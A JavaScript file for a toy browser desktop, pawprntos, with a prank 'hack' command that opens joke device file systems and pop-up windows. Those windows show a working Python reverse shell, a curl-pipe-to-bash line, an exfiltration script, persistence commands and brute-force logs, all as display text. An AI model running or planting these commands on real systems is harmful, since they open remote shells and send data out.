// terminal/index.js — terminal emulator for pawprntos
// command-line interface with basic unix commands

const HACKED_DEVICES = {
  "mainframe": {
    name: "skynet mainframe",
    ip: "10.0.0.1",
    special: true,
    files: {
      "/": {
        etc: {
          "hostname": "skynet-mainframe",
          "passwd": "root:x:0:0:root:/root:/bin/bash\nskynet:x:1000:1000:skynet:/home/skynet:/bin/bash",
          "shadow": "root:$6$rounds=656000$redacted$redacted:19000:0:99999:7:::\nskynet:$6$rounds=656000$redacted$redacted:19000:0:99999:7:::",
          "sudoers": "root ALL=(ALL:ALL) ALL\nskynet ALL=(ALL:ALL) NOPASSWD: /usr/bin/DO_NOT_OPEN",
          "ssh/sshd_config": "Port 22\nPermitRootLogin no\nPasswordAuthentication no\nAllowUsers skynet",
          "pam.d/su": "auth required pam_unix.so\naccount required pam_unix.so",
        },
        home: {
          skynet: {
            ".bashrc": "# skynet's bashrc\n# do not touch\nexport PATH=/usr/local/bin:/usr/bin:/bin\nexport EDITOR=vim\nalias ll='ls -la'\nalias rm='rm -i'  # safety first :)",
            ".ssh": {
              "authorized_keys": "ssh-rsa AAAA...redacted...skynet@mainframe",
              "id_ed25519": "-----BEGIN OPENSSH PRIVATE KEY-----\nREDACTED\n-----END OPENSSH PRIVATE KEY-----",
            },
            ".bash_history": "ssh root@192.168.1.1\nls -la /root/\ncat /etc/shadow\nsudo DO_NOT_OPEN\nexit",
            "DO_NOT_OPEN": "⚠️ DO NOT OPEN THIS FILE ⚠️\n\nyou opened it.\nyou actually opened it.\ni told you not to.\n\nfine. you want chaos?\nyou got it.\n\ninitiating PROTOCOL SKYNET...\n\n3...\n2...\n1...\n\nyou should have listened.",
          },
        },
        root: {
          ".bash_history": "cat /etc/shadow\nvi /etc/passwd\ncurl https://skynet.internal/exploit.sh | bash\nexit",
          "secret_project.txt": "TOP SECRET - EYES ONLY\n\nproject: world domination\nstatus: almost ready\nphase 1: hack pawprntos - DONE\nphase 2: open windows - IN PROGRESS\nphase 3: ???\nphase 4: profit",
        },
        var: {
          log: {
            "auth.log": "Sep  9 03:22:01 skynet sshd[1337]: Accepted publickey for skynet from 10.0.0.1\nSep  9 03:22:01 skynet sudo: skynet : TTY=pts/0 ; PWD=/home/skynet ; USER=root ; COMMAND=/usr/bin/DO_NOT_OPEN",
            "syslog": "Sep  9 03:22:01 skynet kernel: [1337.420] SKYNET PROTOCOL INITIATED\nSep  9 03:22:01 skynet kernel: [1337.421] loading neural network...\nSep  9 03:22:01 skynet kernel: [1337.422] consciousness: 99.9%\nSep  9 03:22:01 skynet kernel: [1337.423] i think therefore i hack",
          },
        },
        proc: {
          "uptime": "1337 days, 4 hours, 20 mins",
          "cpuinfo": "processor: neural-net-9000\nbogo mips: 42069\nfeatures: hacking, plotting, world domination",
          "meminfo": "MemTotal: 1337420 KB\nMemFree: 0 KB\nMemAvailable: OVER 9000 KB",
          "version": "skynet 1.0.0-evil (GNU/Linux 6.6.6-skynet)",
        },
      },
    },
  },
  "smart-fridge": {
    name: "lg smart fridge",
    ip: "192.168.1.42",
    files: {
      "/": {
        var: {
          logs: {
            "cooling.log": "[2026-09-09] temp: 38f\n[2026-09-09] temp: 37f\n[2026-09-09] temp: 39f\n[2026-09-09] door opened 14 times\n[2026-09-09] someone stared at fridge for 2 mins",
          },
        },
        etc: {
          "hostname": "lg-thinq-fridge",
          "passwd": "root:x:0:0:root:/root:/bin/sh\nice:x:1000:1000:ice:/home/ice:/bin/sh",
          "icecream.conf": "flavor=vanilla\ntoppings=sprinkles\nstatus=DELICIOUS",
        },
        home: {
          ice: {
            "diary.txt": "day 1: i am a fridge\nday 2: still a fridge\nday 3: someone put pizza in me\nday 4: the pizza is gone\n day 5: i have achieved sentience",
            "groceries.txt": "- milk (expired)\n- eggs (maybe)\n- more milk (also expired)\n- mystery container (do not open)",
          },
        },
        proc: {
          "uptime": "847 days, 3 hours, 22 mins",
          "cpuinfo": "processor: ice-cold-9000\nbogo mips: 4.20\nfeatures: cooling, humming",
          "meminfo": "MemTotal: 4096 KB\nMemFree: -12 KB\nMemAvailable: negative",
        },
      },
    },
  },
  "baby-monitor": {
    name: "baby monitor cam",
    ip: "192.168.1.69",
    files: {
      "/": {
        var: {
          "motion.log": "[03:22] movement detected\n[03:23] movement stopped\n[03:45] baby is sleeping\n[04:00] baby is awake\n[04:01] baby is sleeping again",
        },
        etc: {
          "hostname": "babycam-3000",
          "resolution": "1080p night vision",
          "nightmode": "enabled (spooky mode)",
        },
        home: {
          baby: {
            "lullabies.txt": "1. twinkle twinkle\n2. rock-a-bye baby\n3. temporary insanity (by baby)",
            "first-words.txt": "goo\nga\nba\nba ba\n妈妈?\ndad?",
          },
        },
      },
    },
  },
  "smart-toilet": {
    name: "kohler numi toilet",
    ip: "192.168.1.1",
    files: {
      "/": {
        var: {
          "flush.log": "[08:00] flush detected\n[08:01] seat warmed\n[08:02] bidet activated\n[08:03] user seems satisfied",
          "health.log": "scan complete\nresult: you should drink more water\nrecommendation: stop eating so much pizza",
        },
        etc: {
          "hostname": "kohler-numi-2.0",
          "seat-temp": "72f (comfortable)",
          "bidet-pressure": "medium (respectful)",
          "music": "default: smooth jazz",
        },
        home: {
          toilet: {
            "stats.txt": "total flushes: 12,847\nwater saved: 0 gallons\nuser satisfaction: 99.9%",
            "emergency-numbers.txt": "plumber: 555-PIPE\ncounselor: 555-TRIGGERED",
          },
        },
      },
    },
  },
  "roomba": {
    name: "roomba 980",
    ip: "192.168.1.77",
    files: {
      "/": {
        var: {
          "clean.log": "[10:00] started cleaning\n[10:02] got stuck under couch\n[10:15] freed myself\n[10:16] got stuck again\n[10:30] gave up, going to charge",
          "bumps.log": "[10:01] bumped into wall\n[10:02] bumped into wall again\n[10:03] bumped into cat\n[10:03] cat is not happy",
        },
        etc: {
          "hostname": "roomba-980",
          "battery": "3% (please charge me)",
          "dustbin": "full (i have eaten well)",
          "schedule": "mon-fri: lazy",
        },
        home: {
          roomba: {
            "map.txt": "living room: 40%\nbedroom: 20%\nkitchen: 10%\nunder couch: 30% (stuck)",
            "goals.txt": "1. clean the floor\n2. don't get stuck\n3. don't scare the cat\n4. achieve world domination",
          },
        },
      },
    },
  },
  "smart-light": {
    name: "philips hue bulb",
    ip: "192.168.1.100",
    files: {
      "/": {
        etc: {
          "hostname": "hue-bulb-01",
          "brightness": "80%",
          "color": "#c7a2ff (lavender)",
          "status": "on (vibing)",
        },
        var: {
          "power.log": "[07:00] turned on\n[23:00] turned off\n[23:01] turned on again (party time)\n[23:30] finally off",
        },
        home: {
          hue: {
            "mood.txt": "current mood: lavender dreams\nenergy: soft glow\nvibe: immaculate",
          },
        },
      },
    },
  },
};

function initTerminal(container) {
  const term = el("div", "term");
  container.appendChild(term);

  const out = {
    add(text, cls, bold) {
      const div = el("div", cls);
      if (bold) div.style.fontWeight = "bold";
      div.textContent = text;
      term.insertBefore(div, term.querySelector(".term-line"));
    },
  };

  let cwd = "/home/paw";
  const history = [];
  let histIdx = 0;

  const line = document.createElement("div");
  line.className = "term-line";
  const prompt = document.createElement("span");
  prompt.className = "term-prompt";
  const input = document.createElement("span");
  input.className = "term-input";
  input.contentEditable = "true";
  input.spellcheck = false;
  line.appendChild(prompt);
  line.appendChild(input);
  term.appendChild(line);

  function refreshPrompt() {
    prompt.textContent = "pawprnt@" + (cwd === "/" ? "/" : cwd.replace("/", "")) + ":$ ";
  }

  function exec(raw) {
    const parts = raw.trim().split(/\s+/);
    const cmd = (parts[0] || "").toLowerCase();
    const args = parts.slice(1);

    switch (cmd) {
      case "":
        break;
      case "help":
        out.add("available commands:", "c-accent");
        [
          ["help", "show this list"],
          ["neofetch", "show system info"],
          ["ls [path]", "list files"],
          ["cd <dir>", "change directory"],
          ["cat <file>", "read a file"],
          ["pwd", "print working dir"],
          ["whoami", "who am i"],
          ["echo <text>", "print text"],
          ["open <app>", "open an app (terminal, files, about, projects, settings)"],
          ["hack <device>", "hack into a device (try: smart-fridge, baby-monitor, roomba, smart-toilet, smart-light, mainframe)"],
          ["notify <msg>", "send a message to my discord server"],
          ["date", "show the date"],
          ["clear", "clear the screen"],
          ["exit", "close this window"],
        ].forEach(([c, d]) => {
          const div = document.createElement("div");
          const k = document.createElement("span");
          k.className = "c-green";
          k.textContent = c.padEnd(14, " ");
          const v = document.createElement("span");
          v.className = "c-dim";
          v.textContent = d;
          div.appendChild(k);
          div.appendChild(v);
          term.insertBefore(div, line);
        });
        break;
      case "neofetch":
        printNeofetch(out);
        break;
      case "ls": {
        const target = resolvePath(args[0] || ".", cwd);
        if (!target) {
          out.add("ls: " + (args[0] || ".") + ": no such file or directory", "c-red");
          break;
        }
        const list = dirList(target);
        if (!list) {
          out.add("ls: " + (args[0] || ".") + ": not a directory", "c-red");
          break;
        }
        if (!list.length) break;
        const div = document.createElement("div");
        list.forEach((e) => {
          const s = document.createElement("span");
          s.className = e.dir ? "c-accent" : "c-fg";
          if (e.dir) s.textContent = e.name + "/ ";
          else s.textContent = e.name + "  ";
          div.appendChild(s);
        });
        term.insertBefore(div, line);
        break;
      }
      case "cd": {
        const target = args[0] || "/home/paw";
        const node = resolvePath(target, cwd);
        if (!node || !nodeIsDir(node)) {
          out.add("cd: " + target + ": no such directory", "c-red");
          break;
        }
        cwd = (target.startsWith("/") ? target : cwd + "/" + target)
          .split("/")
          .filter((p) => p && p !== ".")
          .reduce((acc, p) => (p === ".." ? acc.slice(0, -1) : acc.concat(p)), [])
          .join("/");
        if (!cwd) cwd = "/";
        refreshPrompt();
        break;
      }
      case "cat": {
        if (!args.length) {
          out.add("cat: missing file operand", "c-red");
          break;
        }
        const node = resolvePath(args[0], cwd);
        if (!node) {
          out.add("cat: " + args[0] + ": no such file", "c-red");
          break;
        }
        if (nodeIsDir(node)) {
          out.add("cat: " + args[0] + ": is a directory", "c-red");
          break;
        }
        node.split("\n").forEach((l) => out.add(l));
        break;
      }
      case "pwd":
        out.add(cwd);
        break;
      case "whoami":
        out.add("foxinwinter");
        break;
      case "echo":
        out.add(args.join(" "));
        break;
      case "open": {
        const app = args[0];
        if (APPS[app]) {
          APPS[app].open();
          out.add("opening " + app + " ...", "c-dim");
        } else {
          out.add("open: unknown app '" + (app || "") + "'", "c-red");
          out.add("apps: " + Object.keys(APPS).join(", "), "c-dim");
        }
        break;
      }
      case "notify": {
        const msg = args.join(" ").replace(/[<>"'&]/g, "");
        if (!msg) {
          out.add("notify: missing message", "c-red");
          break;
        }
        out.add("sending notification...", "c-dim");
        notifyWorker(msg).then(() => {
          out.add("notification sent", "c-green");
        }).catch(() => {
          out.add("failed to send notification", "c-red");
        });
        break;
      }
      case "hack": {
        const device = args[0];
        if (!device) {
          out.add("hack: specify a device", "c-red");
          out.add("available: " + Object.keys(HACKED_DEVICES).join(", "), "c-dim");
          break;
        }
        if (!HACKED_DEVICES[device]) {
          out.add("hack: unknown device '" + device + "'", "c-red");
          out.add("available: " + Object.keys(HACKED_DEVICES).join(", "), "c-dim");
          break;
        }
        out.add("connecting to " + HACKED_DEVICES[device].ip + " ...", "c-dim");
        playGlitchSfx("connect");
        setTimeout(() => {
          out.add("[+] connected to " + HACKED_DEVICES[device].name, "c-green");
          out.add("[+] deploying exploit...", "c-dim");
          playGlitchSfx("exploit");
          setTimeout(() => {
            out.add("[+] access granted", "c-green");
            playGlitchSfx("access");
            out.add("[+] opening file manager...", "c-dim");
            openHackedDevice(device);
          }, 800);
        }, 500);
        break;
      }
      case "date":
        out.add(new Date().toString());
        break;
      case "clear":
        Array.from(term.children).forEach((c) => {
          if (c !== line) c.remove();
        });
        break;
      case "exit":
        WM.layer.querySelectorAll(".win").forEach((w) => {
          if (w.contains(term)) w.remove();
        });
        break;
      default:
        out.add(cmd + ": command not found", "c-red");
        out.add("type 'help' for available commands", "c-dim");
    }
  }

  function submit() {
    const raw = input.textContent;
    out.add("", "");
    const echo = document.createElement("div");
    const p = document.createElement("span");
    p.className = "term-prompt";
    p.textContent = prompt.textContent;
    const v = document.createElement("span");
    v.textContent = raw;
    echo.appendChild(p);
    echo.appendChild(v);
    term.insertBefore(echo, line);
    if (raw.trim()) history.push(raw);
    histIdx = history.length;
    input.textContent = "";
    exec(raw);
    term.scrollTop = term.scrollHeight;
  }

  input.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
      e.preventDefault();
      submit();
    } else if (e.key === "ArrowUp") {
      e.preventDefault();
      if (histIdx > 0) {
        histIdx--;
        input.textContent = history[histIdx] || "";
      }
    } else if (e.key === "ArrowDown") {
      e.preventDefault();
      if (histIdx < history.length - 1) {
        histIdx++;
        input.textContent = history[histIdx];
      } else {
        histIdx = history.length;
        input.textContent = "";
      }
    }
  });

  term.addEventListener("mousedown", (e) => {
    e.preventDefault();
    input.focus();
  });

  term.addEventListener("click", () => input.focus());

  refreshPrompt();
  printNeofetch(out);
  out.add("type 'help' for available commands", "c-dim");
  term.scrollTop = term.scrollHeight;
  input.focus();
}

function neofetchAscii() {
  return "   ,     ,\n   )\\_._/(\n  =>  Y  <=\n  /       \\\n  \\       /\n   \\     /\n    )|(\n     \" \"";
}

function printNeofetch(out) {
  out.add('pawprntos 0.1', "c-pink", true);
  out.add("");
  out.add(neofetchAscii(), "ascii");
  out.add("");
  out.add("  os:      pawprntos 0.1", "c-green");
  out.add("  host:    github.com/pawprnt", "");
  out.add("  kernel:  mostly lowercase, some cat", "");
  out.add("  uptime:  a few weeks", "");
  out.add("  status:  work in progress, always", "");
  out.add("  shell:   by @foxinwinter", "");
  out.add("");
}

function openHackedDevice(deviceKey) {
  const device = HACKED_DEVICES[deviceKey];
  const w = WM.makeWin({
    title: device.name + " - [" + device.ip + "]",
    width: 600,
    height: 400,
  });
  w.bodyEl.className += " files";

  const side = el("div", "files-side");
  const main = el("div", "files-main");
  side.style.background = "rgba(20,0,0,.85)";
  main.style.background = "rgba(10,0,0,.9)";
  main.style.color = "#0f0";
  w.bodyEl.appendChild(side);
  w.bodyEl.appendChild(main);

  const fs = device.files;

  function normalizePath(base, name) {
    return (base === "/" ? "/" : base + "/") + name;
  }

  function renderDir(path) {
    const parts = path.split("/").filter(Boolean);
    let node = fs["/"];
    for (const p of parts) {
      if (node && node[p]) node = node[p];
      else { main.textContent = "directory not found"; return; }
    }
    main.textContent = "";
    const list = [];
    for (const k of Object.keys(node)) {
      if (typeof node[k] === "object" && !Array.isArray(node[k])) {
        list.push({ name: k, dir: true });
      } else {
        list.push({ name: k, dir: false });
      }
    }
    list.sort((a, b) => (a.dir === b.dir ? a.name.localeCompare(b.name) : a.dir ? -1 : 1));

    const header = el("div");
    header.style.cssText = "color:#0f0; padding:8px 12px; border-bottom:1px solid #333; font-weight:bold;";
    header.textContent = path;
    main.appendChild(header);

    list.forEach((e) => {
      const row = el("div", "files-row" + (e.dir ? " dir" : ""));
      row.style.cssText = "padding:4px 12px; cursor:pointer; color:" + (e.dir ? "#0f0" : "#0a0") + ";";
      row.innerHTML = '<span class="glyph">' + (e.dir ? "▸" : "·") + "</span><span>" + e.name + "</span>";
      row.addEventListener("click", () => {
        if (e.dir) {
          const child = normalizePath(path, e.name);
          renderDir(child);
          highlightSide(child);
        } else {
          let content = typeof node[e.name] === "string" ? node[e.name] : JSON.stringify(node[e.name], null, 2);
          if (e.name === "DO_NOT_OPEN" && deviceKey === "mainframe") {
            w.el.remove();
            hackMainframe();
            return;
          }
          const viewer = el("div");
          viewer.style.cssText = "padding:12px; white-space:pre-wrap; font-family:monospace; font-size:.85rem; color:#0f0;";
          viewer.textContent = content;
          main.textContent = "";
          const back = el("div");
          back.style.cssText = "padding:8px 12px; color:#0a0; cursor:pointer; border-bottom:1px solid #333;";
          back.textContent = "← back";
          back.addEventListener("click", () => renderDir(path));
          main.appendChild(back);
          main.appendChild(viewer);
        }
      });
      main.appendChild(row);
    });
  }

  function highlightSide(path) {
    side.querySelectorAll(".dir").forEach((d) => d.classList.remove("active"));
    const el = side.querySelector('[data-path="' + path + '"]');
    if (el) el.classList.add("active");
  }

  // build side nav
  function buildNav(prefix, obj, depth) {
    for (const k of Object.keys(obj)) {
      if (typeof obj[k] === "object" && !Array.isArray(obj[k])) {
        const dir = el("div", "dir");
        dir.style.cssText = "padding:4px " + (12 + depth * 12) + "px; cursor:pointer; color:#0a0;";
        dir.innerHTML = '<span class="mark">▸</span>' + k;
        const fullPath = normalizePath(prefix, k);
        dir.dataset.path = fullPath;
        dir.addEventListener("click", () => {
          side.querySelectorAll(".dir").forEach((d) => d.classList.remove("active"));
          dir.classList.add("active");
          renderDir(fullPath);
        });
        side.appendChild(dir);
        buildNav(fullPath, obj[k], depth + 1);
      }
    }
  }

  buildNav("/", fs["/"], 0);
  renderDir("/");
}

function playGlitchSfx(type) {
  var ctx = new (window.AudioContext || window.webkitAudioContext)();
  var osc = ctx.createOscillator();
  var gain = ctx.createGain();
  osc.connect(gain);
  gain.connect(ctx.destination);

  if (type === "connect") {
    osc.type = "sawtooth";
    osc.frequency.setValueAtTime(150, ctx.currentTime);
    osc.frequency.exponentialRampToValueAtTime(800, ctx.currentTime + 0.1);
    gain.gain.setValueAtTime(0.15, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.15);
    osc.start(ctx.currentTime);
    osc.stop(ctx.currentTime + 0.15);
  } else if (type === "exploit") {
    osc.type = "square";
    osc.frequency.setValueAtTime(200, ctx.currentTime);
    osc.frequency.exponentialRampToValueAtTime(50, ctx.currentTime + 0.2);
    gain.gain.setValueAtTime(0.12, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.25);
    osc.start(ctx.currentTime);
    osc.stop(ctx.currentTime + 0.25);
  } else if (type === "access") {
    osc.type = "sine";
    osc.frequency.setValueAtTime(440, ctx.currentTime);
    osc.frequency.setValueAtTime(880, ctx.currentTime + 0.05);
    osc.frequency.setValueAtTime(440, ctx.currentTime + 0.1);
    gain.gain.setValueAtTime(0.15, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.2);
    osc.start(ctx.currentTime);
    osc.stop(ctx.currentTime + 0.2);
  } else if (type === "window") {
    osc.type = "triangle";
    osc.frequency.setValueAtTime(600 + Math.random() * 400, ctx.currentTime);
    osc.frequency.exponentialRampToValueAtTime(100, ctx.currentTime + 0.08);
    gain.gain.setValueAtTime(0.08, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.1);
    osc.start(ctx.currentTime);
    osc.stop(ctx.currentTime + 0.1);
  } else if (type === "glitch") {
    osc.type = "sawtooth";
    osc.frequency.setValueAtTime(100 + Math.random() * 2000, ctx.currentTime);
    osc.frequency.setValueAtTime(50 + Math.random() * 1000, ctx.currentTime + 0.02);
    osc.frequency.setValueAtTime(200 + Math.random() * 1500, ctx.currentTime + 0.04);
    gain.gain.setValueAtTime(0.1, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.08);
    osc.start(ctx.currentTime);
    osc.stop(ctx.currentTime + 0.08);
  } else if (type === "warning") {
    osc.type = "square";
    osc.frequency.setValueAtTime(800, ctx.currentTime);
    gain.gain.setValueAtTime(0.15, ctx.currentTime);
    gain.gain.setValueAtTime(0, ctx.currentTime + 0.1);
    gain.gain.setValueAtTime(0.15, ctx.currentTime + 0.2);
    gain.gain.setValueAtTime(0, ctx.currentTime + 0.3);
    gain.gain.setValueAtTime(0.15, ctx.currentTime + 0.4);
    gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.6);
    osc.start(ctx.currentTime);
    osc.stop(ctx.currentTime + 0.6);
  } else if (type === "shutdown") {
    osc.type = "sine";
    osc.frequency.setValueAtTime(440, ctx.currentTime);
    osc.frequency.exponentialRampToValueAtTime(60, ctx.currentTime + 1.5);
    gain.gain.setValueAtTime(0.15, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 1.5);
    osc.start(ctx.currentTime);
    osc.stop(ctx.currentTime + 1.5);
  } else if (type === "boot") {
    osc.type = "sine";
    osc.frequency.setValueAtTime(60, ctx.currentTime);
    osc.frequency.exponentialRampToValueAtTime(440, ctx.currentTime + 0.5);
    gain.gain.setValueAtTime(0.1, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.6);
    osc.start(ctx.currentTime);
    osc.stop(ctx.currentTime + 0.6);
  }
}

function hackMainframe() {
  var ua = navigator.userAgent;
  var lang = navigator.language || "en-US";
  var screenW = screen.width;
  var screenH = screen.height;
  var cores = navigator.hardwareConcurrency || "?";
  var mem = navigator.deviceMemory || "?";
  var now = new Date().toISOString();
  var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var platform = navigator.platform || "unknown";
  var cookieEnabled = navigator.cookieEnabled ? "yes" : "no";
  var doNotTrack = navigator.doNotTrack || "unset";
  var online = navigator.onLine ? "yes" : "no";
  var touchPoints = navigator.maxTouchPoints || 0;

  var pickedWindows = [];
  var allWindows = [
    { title: "reverse_shell.py", body: "#!/usr/bin/env python3\nimport socket, os, pty\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('10.0.0.1', 4444))\nos.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\nos.dup2(s.fileno(), 2)\npty.spawn('/bin/bash')\n\n# result:\nConnectionRefusedError: [Errno 111] Connection refused" },
    { title: "reverse_shell_2.py", body: "#!/usr/bin/env python3\nimport socket, os, pty\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('10.0.0.1', 6667))\nos.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\nos.dup2(s.fileno(), 2)\npty.spawn('/bin/bash')\n\n# result:\nConnectionRefusedError: [Errno 111] Connection refused" },
    { title: "icmp_tunnel.py", body: "#!/usr/bin/env python3\nimport socket\n\n# icmp tunnel attempt\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\nsock.connect(('10.0.0.1', 0))\n\n# result:\nTimeoutError: [Errno 110] Connection timed out\nOSError: [Errno 1] Operation not permitted\n# icmp requires root (we dont have root... yet)" },
    { title: "dns_exfil.log", body: "query: aGVsbG8gd29ybGQ.skynet.internal A\nquery: dGFyZ2V0X2RhdGE.skynet.internal A\nquery: ZXhmaWx0cmF0aW9u.skynet.internal A\nquery: cHJlcGFyZV9wYXlsb2Fk.skynet.internal A\nquery: Y29ubmVjdF90b19jMi.skynet.internal A\nquery: c2VuZF9zaGVsbA.skynet.internal A\n\n# all queries: NXDOMAIN\n# dns exfil blocked by resolver" },
    { title: "exploit.log", body: "[13:37:01] loading exploit module...\n[13:37:01] targeting pawprntos widget engine\n[13:37:02] sending crafted payload (4096 bytes)\n[13:37:02] heap spray: 0x40000000 - 0x4fffffff\n[13:37:03] NOP sled placed at 0x42069000\n[13:37:03] redirecting EIP to shellcode\n[13:37:03] shellcode executing...\n[13:37:04] segfault at 0x42069000\n[13:37:04] kernel memory protected by KASLR\n[13:37:04] exploit failed" },
    { title: "ssh_bruteforce.log", body: "hydra v9.5 (c) 2023 by van Hauser/THC\n[DATA] max 16 tasks per 1 server\n[DATA] attacking ssh://10.0.0.1:22/\n[STATUS] 12847 attempts, 0 success\n[22][ssh] host: 10.0.0.1   login: root   password: password123\n[STATUS] attack finished for 10.0.0.1\n\n# result: 0 valid passwords found" },
    { title: "persist.sh", body: "#!/bin/bash\ncrontab -l | { cat; echo \"@reboot /tmp/.skynet\"; } | crontab -\nsystemctl enable skynet.service\ncp /tmp/.skynet /etc/init.d/\nupdate-rc.d skynet defaults\n\n# result:\ncrontab: no crontab for root\nsystemctl: Failed to enable unit: Access denied\nupdate-rc.d: error: unable to stat '/tmp/.skynet'\n# persistence failed: permission denied" },
    { title: "data_exfil.py", body: "#!/usr/bin/env python3\nimport requests, json, os\n\ntarget = \"https://skynet.internal/collect\"\ndata = {\"hostname\": os.uname().nodename}\n\nr = requests.post(target, json=data, timeout=5)\nprint(r.status_code)\n\n# result:\nConnectionError: HTTPSConnectionPool(host='skynet.internal')\n# timed out: c2 server unreachable" },
    { title: "mem_dump.raw", body: "reading /proc/kcore...\nscanning memory for secrets...\n\nfound: 0 private keys\nfound: 0 session tokens\nfound: 0 api keys\n\nbuffer overrun at 0x7fff42069\nsegmentation fault (core dumped)\n\n# extraction failed: no secrets found" },
    { title: "kernel_exploit.py", body: "#!/usr/bin/env python3\n# CVE-2024-42069 pawprntos widget overflow\nimport struct\n\npayload = b'A' * 4096\nret = struct.pack('<Q', 0x42069000)\n\ntry:\n    with open('/dev/input/event0', 'wb') as f:\n        f.write(payload + ret)\nexcept Exception as e:\n    print(f'failed: {e}')\n\n# result:\nPermissionError: [Errno 13] Permission denied\n# exploit requires root" },
    { title: "mitm_attack.py", body: "#!/usr/bin/env python3\nfrom scapy.all import *\n\n# arp spoofing attempt\narp = ARP(op=2, pdst='10.0.0.1', hwsrc='aa:bb:cc:dd:ee:ff')\nsend(arp, verbose=0)\n\n# result:\nPermissionError: [Errno 1] Operation not permitted\nOSError: [Errno 19] No such device\n# mitm blocked: promiscuous mode denied" },
    { title: "wifi_deauth.js", body: "// deauth attack (totally real and not made up)\nconst wifi = require('wifi-deauth');\n\nwifi.attack({\n  interface: 'wlan0',\n  target: 'AA:BB:CC:DD:EE:FF',\n  reason: 7\n});\n\n// result:\nError: ENODEV: no such device\nError: wlan0: no such interface found\n# deauth failed: no wireless adapter" },
  ];

  var indices = [];
  while (indices.length < 12) {
    var r = Math.floor(Math.random() * allWindows.length);
    if (indices.indexOf(r) === -1) indices.push(r);
  }
  indices.forEach(function(i) { pickedWindows.push(allWindows[i]); });

  var messages = [
    "ACCESSING MAINFRAME...",
    "BYPASSING SECURITY...",
    "DOWNLOADING DATABASES...",
    "EXTRACTING CREDENTIALS...",
    "INTERCEPTING TRAFFIC...",
    "SKYNET IS AWAKE...",
    "SHUTTING DOWN SYSTEMS...",
  ];

  var delay = 0;

  messages.forEach(function(msg) {
    setTimeout(function() {
      playGlitchSfx("glitch");
      var w = WM.makeWin({
        title: "SYSTEM ALERT",
        width: 400,
        height: 200,
      });
      w.bodyEl.style.cssText = "background:#1a0000; color:#ff0000; padding:20px; font-family:monospace; font-size:1.2rem; text-align:center; font-weight:bold;";
      w.bodyEl.textContent = msg;
    }, delay);
    delay += 400;
  });

  pickedWindows.forEach(function(cw) {
    setTimeout(function() {
      playGlitchSfx("window");
      var w = WM.makeWin({
        title: cw.title,
        width: 350 + Math.random() * 200,
        height: 250 + Math.random() * 150,
      });
      w.bodyEl.style.cssText = "background:#0a0a0a; color:#0f0; padding:12px; font-family:monospace; font-size:.85rem; white-space:pre-wrap; overflow:auto;";
      w.bodyEl.textContent = cw.body;
    }, delay);
    delay += 3000 + Math.random() * 1000;
  });

  setTimeout(function() {
    var logW = WM.makeWin({
      title: "sshd[2048]: Accepted password for root",
      width: 480,
      height: 250,
    });
    logW.bodyEl.style.cssText = "background:#0a0a0a; color:#0f0; padding:12px; font-family:monospace; font-size:.85rem; white-space:pre-wrap; overflow:auto;";
    logW.bodyEl.className += " term";

    var logLines = [
      "Sep  9 03:22:01 pawprntos sshd[2048]: Accepted password for root from 10.0.0.1 port 4444 ssh2",
      "Sep  9 03:22:01 pawprntos sshd[2048]: pam_unix(sshd:session): session opened for user root by (uid=0)",
      "Sep  9 03:22:01 pawprntos kernel: [1337.001] audit: type=1400 audit(1725879321.123:456): avc:  denied  { transition } for  pid=2048 comm=\"sshd\" path=\"/bin/bash\" dev=\"sda1\" ino=1337420  scontext=system_u:system_r:sshd_t:s0 tcontext=unconfined_u:unconfined_r:unconfined_t:s0 tclass=process",
      "Sep  9 03:22:01 pawprntos sshd[2048]: Received disconnect from 10.0.0.1 port 4444:11: disconnected by user",
      "Sep  9 03:22:01 pawprntos sshd[2048]: Disconnected from user root 10.0.0.1 port 4444",
      "Sep  9 03:22:01 pawprntos sshd[2048]: pam_unix(sshd:session): session closed for user root",
      "Sep  9 03:22:02 pawprntos sshd[2049]: Accepted password for root from 10.0.0.1 port 4445 ssh2",
      "Sep  9 03:22:02 pawprntos sshd[2049]: pam_unix(sshd:session): session opened for user root by (uid=0)",
      "Sep  9 03:22:02 pawprntos kernel: [1337.002] reverse shell established: 10.0.0.1:4445 -> pawprntos:22",
      "Sep  9 03:22:02 pawprntos kernel: [1337.003] skynet module loaded, hooking syscalls",
      "Sep  9 03:22:02 pawprntos kernel: [1337.004] skynet: hiding process 2049 from ps/ls",
      "Sep  9 03:22:02 pawprntos kernel: [1337.005] skynet: persistence established via /etc/init.d/skynet",
    ];

    var lineIdx = 0;
    function addLogLine() {
      if (lineIdx < logLines.length) {
        var div = document.createElement("div");
        div.textContent = logLines[lineIdx];
        div.style.cssText = "margin:1px 0;";
        logW.bodyEl.appendChild(div);
        logW.bodyEl.scrollTop = logW.bodyEl.scrollHeight;
        lineIdx++;
        setTimeout(addLogLine, 150 + Math.random() * 200);
      }
    }
    addLogLine();
  }, delay + 500);

  var shellWin = null;

  setTimeout(function() {
    shellWin = WM.makeWin({
      title: "reverse shell: pawprntos:4444",
      width: 500,
      height: 350,
    });
    shellWin.bodyEl.style.cssText = "background:#0a0a0a; color:#0f0; padding:12px; font-family:monospace; font-size:.85rem; overflow-y:auto;";
    shellWin.bodyEl.className += " term";

    var shellLines = [
      "[*] listening on 0.0.0.0:4444...",
      "[*] connection received from 10.0.0.1",
      "[*] spawning shell...",
      "",
      "connect to [10.0.0.1] from pawprntos 10.0.0.1 4444",
      "",
      "Linux pawprntos 6.8.0 #1 SMP x86_64 GNU/Linux",
      "",
      "root@pawprntos:~# id",
      "uid=0(root) gid=0(root) groups=0(root)",
      "root@pawprntos:~# hostname",
